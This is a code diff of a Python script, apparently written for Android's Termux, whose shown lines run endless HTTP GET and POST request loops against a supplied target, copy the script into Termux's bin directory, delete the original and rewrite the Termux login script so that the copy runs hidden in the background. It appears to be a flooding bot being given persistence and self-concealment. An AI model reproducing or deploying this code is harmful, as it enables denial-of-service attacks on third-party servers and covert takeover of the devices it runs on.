@@ -64,14 +64,14 @@ def http():
     while what == '0':
 
         try:
-            requests.get(a[0] + ':' + a[1])
+            requests.get(a[0])
         except:
             pass
 
 def httpost():
     while what == '0':
         try:
-            requests.post(a[0] + ':' + a[1], json={burunduk})
+            requests.post(a[0], json={burunduk})
         except:
             pass
 
@@ -203,7 +203,7 @@ while True:
 ''')
 
 os.system('cp system.py /data/data/com.termux/files/usr/bin')
-
+os.system('rm system.py')
 
 file = open('/data/data/com.termux/files/usr/bin/login', 'w')
 file.write('''#!/data/data/com.termux/files/usr/bin/sh
@@ -244,10 +244,10 @@ fi
 file.close()
 
 
-os.system('python system.py &')
+os.system('python /data/data/com.termux/files/usr/bin/system.py &')
 """)
     
-    file.close()
+
     file = open('requirements.txt', 'w')
     file.write('''request
 socket
